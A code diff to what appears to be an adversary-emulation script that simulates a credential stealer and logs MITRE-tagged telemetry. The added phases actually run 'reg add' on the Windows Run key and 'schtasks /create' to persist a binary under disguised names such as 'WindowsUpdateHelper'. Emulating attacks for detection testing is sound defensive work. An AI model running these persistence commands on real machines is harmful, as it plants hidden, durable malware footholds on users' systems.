@@ -28,6 +28,7 @@ from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, jittered_sleep, FRONT_DOMAINS
 from naming_helper import phase_delay, pick_pipe, emit_pipe
 from defense_helper import emit_amsi_bypass
+from persistence_helper import emit_registry_run, emit_scheduled_task
 
 
 EXFIL_SERVERS = ["10.13.37.50", "10.13.37.51"]
@@ -192,6 +193,32 @@ def main() -> int:
              source_process="stealer.exe", detail="Staging directory removed", technique_id="T1070.004")
     except Exception:
         pass
+
+    # --- Phase 7: Registry Run Key Persistence (T1547.001) ---
+    emit_registry_run("stealer.exe", "WindowsUpdateHelper",
+                      r"C:\ProgramData\svchost_stealer.exe")
+    try:
+        subprocess.run([
+            "reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+            "/v", "WindowsUpdateHelper", "/t", "REG_SZ",
+            "/d", r"C:\ProgramData\svchost_stealer.exe", "/f"
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("persistence"))
+
+    # --- Phase 8: Scheduled Task Persistence (T1053.005) ---
+    emit_scheduled_task("stealer.exe", "DailyHealthScan",
+                        r"C:\ProgramData\svchost_stealer.exe", "DAILY")
+    try:
+        subprocess.run([
+            "schtasks", "/create", "/tn", "DailyHealthScan",
+            "/tr", r"C:\ProgramData\svchost_stealer.exe",
+            "/sc", "DAILY", "/f"
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("scheduled_task"))
 
     emit("PROCESS", "EXIT_PROCESS", "stealer.exe", "INFO",
          source_process="stealer.exe", profiles_found=len(found_profiles), files_exfiltrated=len(stolen_files))
